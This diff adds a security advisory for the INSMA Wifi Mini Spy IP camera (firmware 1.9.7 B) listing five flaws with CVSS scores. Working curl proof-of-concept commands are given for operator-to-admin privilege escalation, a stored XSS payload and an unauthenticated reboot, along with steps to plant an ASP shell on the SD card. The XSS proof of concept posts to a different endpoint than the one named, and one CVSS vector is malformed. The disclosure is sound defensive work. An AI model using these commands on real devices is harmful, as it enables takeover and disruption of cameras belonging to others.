@@ -1,0 +1,66 @@
+Vendor:  INSMA
+Product: "Wifi Mini Spy 1080P HD Security IP Camera"
+Version: 1.9.7 B
+
+----------------
+
+# Privilege Defined With Unsafe Actions (CWE-267) 
+
+A user with "operator" privileges can escalate his privileges to "admin" privileges.
+Note: this doesn't work for a user with "guest" privileges.
+
+Proof of Concept:
+$ curl 'http://192.168.10.1/goform/formUserMng' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Authorization: Basic <oper credentials base64 encoded>' \
+> --data 'um1_name=dtuhax&um1_pwd=1234&um1_grp=2&um2_name=&um2_pwd=&um2_grp=0&um3_name=&um3_pwd=&um3_grp=0&um4_name=&um4_pwd=&um4_grp=0&um5_name=&um5_pwd=&um5_grp=0&um6_name=&um6_pwd=&um6_grp=0'
+
+This will overwrite user1 with the username "dtuhax" and password "1234" (in "group 2" = the admin group).
+
+The CVSSv3 vector string is: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N/E:F/RL:U/RC:R/CR:X/IR:X/AR:X/MAV:N/MAC:L/MPR:X/MUI:N/MS:U/MC:H/MI:L/MA:N
+Giving a CVSS score of 6.7
+
+----------------
+
+# Unrestricted Upload of File with Dangerous Type (CWE-434)
+
+By changing the bytes in "recdata.db" that correspond to ".avi" to ".asp", but keeping the rest of the database structure the same,
+it is possible to put a .asp shell on the SD card (with the same name as a media file) and execute it by visiting "http://192.168.10.1/SD/<filename>.asp".
+
+Note that "ASP" refs to GoAhead, not Microsoft Active Server Page.
+
+The CVSSv3 vector string is: AV:P/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:N/E:P/RL:U/RC:R/CR:X/IR:X/AR:X/MAV:P/MAC:H/MPR:H/MUI:N/MS:U/MC:H/MI:H/MA:N
+Giving a CVSS score of 4.9
+
+----------------
+
+# Stored Cross-Site Scripting in FTP settings
+
+All fields sent from the FTP settings page to "goform/formSetFtpCfg" is vulnerable to a stored XSS.
+
+Proof of Concept:
+$ curl 'http://192.168.10.1/goform/formUserMng' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Authorization: Basic <oper credentials base64 encoded>' \
+> --data 'ftp_sev=192.168.10.1"><script>alert(0)</script>&ftp_port=21&ftp_user=anonymous&ftp_pass=&ftp_folder=/tmp/&do_test=1'
+
+The CVSSv3 vector string is: AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N/E:P/RL:U/RC:R/CR:X/IR:X/AR:X/MAV:N/MAC:H/MPR:N/MUI:R/MS:U/MC:H/MI:H/MA:N
+Giving a CVSS score of 6.2
+
+----------------
+
+# Cross-Site Request Forgery
+
+All fields in the WebUI is vulnerable to CSRF.
+
+The CVSSv3 vector string is: V:N/AC:H/PR:N/UI:R/S:U/C:L/I:H/A:N/E:P/RL:U/RC:R/CR:X/IR:X/AR:X/MAV:N/MAC:H/MPR:N/MUI:R/MS:U/MC:L/MI:H/MA:N
+Giving a CVSS score of 5.4
+
+----------------
+
+# Reboot DoS
+
+The "/media/?action=cmd" endpoint has a hidden reboot command ("&code=255&value=255") that everyone can use to force the camera to reboot
+
+Proof of Concept:
+$ curl "http://192.168.10.1/media/?action=cmd&code=255&value=255"
+Will reboot the device
+
+The CVSSv3 vector string is: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:F/RL:U/RC:R/CR:X/IR:X/AR:X/MAV:N/MAC:L/MPR:N/MUI:N/MS:U/MC:N/MI:N/MA:H
+Giving a CVSS score of 7.0
